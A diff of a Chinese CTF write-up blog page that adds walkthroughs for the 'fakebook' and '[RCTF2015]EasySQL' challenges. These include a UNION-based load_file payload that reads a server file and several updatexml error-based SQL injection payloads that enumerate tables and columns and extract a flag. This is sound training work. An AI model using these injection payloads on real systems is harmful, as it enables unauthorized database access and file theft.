@@ -75,7 +75,7 @@
     </p>
   <p class="article-time">
     <time datetime="2019-09-09T16:00:00.000Z" itemprop="datePublished">2019-09-10</time>
-    Updated:<time datetime="2019-10-11T05:00:45.911Z" itemprop="dateModified">2019-10-11</time>
+    Updated:<time datetime="2020-06-29T14:37:55.344Z" itemprop="dateModified">2020-06-29</time>
     
   </p>
 </header>
@@ -84,7 +84,7 @@
 		
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
-		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li></ol></li></ol>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fakebook"><span class="toc-number">1.5.</span> <span class="toc-text">fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCTF2015-EasySQL"><span class="toc-number">1.6.</span> <span class="toc-text">[RCTF2015]EasySQL</span></a></li></ol></li></ol>
 		</div>
 		
 		<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>​    是一道文件上传题，首先抓包分析一波，发现&lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。</p>
@@ -122,8 +122,6 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,2</span><br></pre></td></tr></table></figure>
 
 <p>​    这种也比较好理解，这样就把查询语句分成了两部分</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <h2 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h2><p>​    方法一：字符串拼接</p>
 <p>​    源码中生成sign是这样一行代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
@@ -140,6 +138,30 @@
 <p>​    ps:local-file:///proc/self/cwd/代表当前目录，local-file一定要绝对地址。</p>
 <p>这里推荐一个详细的writeup</p>
 <p><a href="https://xz.aliyun.com/t/6050" target="_blank" rel="noopener">SSRFME一题三解</a></p>
+<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>​    waf没有过滤load_file，给出了文件地址，直接load_file读取/var/www/flag.php,payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">load_file</span>(<span class="string">'/var/www/flag.php'</span>),<span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>可以在源码中看到flag</p>
+<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>​    打开题目是一个登陆页面，随便注册一个登陆。</p>
+<p><img src="https://i.loli.net/2019/11/12/GdEq7NsOHZB5k1V.png" alt></p>
+<p>​    在用户界面有一个重置密码，可能是二次注入。返回注册页面试了一试，发现username和email处存在过滤。首先试一下闭合类型，注册<code>&#39;12&quot;\</code>然后登陆，修改密码发现报错。<img src="C:%5CUsers%5CYCJ%5CAppData%5CLocal%5CTemp%5C1573556029448.png" alt="1573556029448"> </p>
+<p>那这题应该是一个双引号闭合的报错注入。接下来就是爆表,列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x3a),1)#</span><br></pre></td></tr></table></figure>
+
+<p>发现有个flag表，进去之后没有flag，于是搜一下别的表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/12/l6AOEGLTBkboI8U.png" alt></p>
+<p>发现显示不全，限制一下输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/12/yZRwL21DGMbV5i7.png" alt></p>
+<p>得到列名，这里regexp<a href="https://www.cnblogs.com/yizitrd/p/5441988.html" target="_blank" rel="noopener">是正则表达式函数</a>，这里就不再赘述。接下来爆flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a),1)#</span><br></pre></td></tr></table></figure>
+
+<p>也是同样显示不全，这里可以用一个reverse函数反向输出一下查到的字符串。然后自己手动拼一下flag就出来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||updatexml(1,reverse(concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a)),1)#</span><br></pre></td></tr></table></figure>
+
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -192,7 +214,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li></ol></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-tornado"><span class="toc-number">1.1.</span> <span class="toc-text">easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#随便注"><span class="toc-number">1.2.</span> <span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysql"><span class="toc-number">1.3.</span> <span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRFME"><span class="toc-number">1.4.</span> <span class="toc-text">SSRFME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fakebook"><span class="toc-number">1.5.</span> <span class="toc-text">fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCTF2015-EasySQL"><span class="toc-number">1.6.</span> <span class="toc-text">[RCTF2015]EasySQL</span></a></li></ol></li></ol>
   </div>
 
 <div id="asidepart">
@@ -204,7 +226,11 @@
 	<p class="asidetitle">Categories</p>
 		<ul>
 		
+			<li><a href="/categories/WebBook/" title="WebBook">WebBook<sup>1</sup></a></li>
+		
 			<li><a href="/categories/docker/" title="docker">docker<sup>1</sup></a></li>
+		
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>1</sup></a></li>
 		
 			<li><a href="/categories/writeup/" title="writeup">writeup<sup>1</sup></a></li>
 		
@@ -233,7 +259,7 @@
 	
 	<section class="info">
 		<p> Hello <br/>
-			水滴石穿</p>
+			似水流年</p>
 	</section>
 	 
 	<div class="social-font clearfix">
@@ -243,7 +269,7 @@
 		
 		
 	</div>
-		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2019 
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
 		
 		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
 		
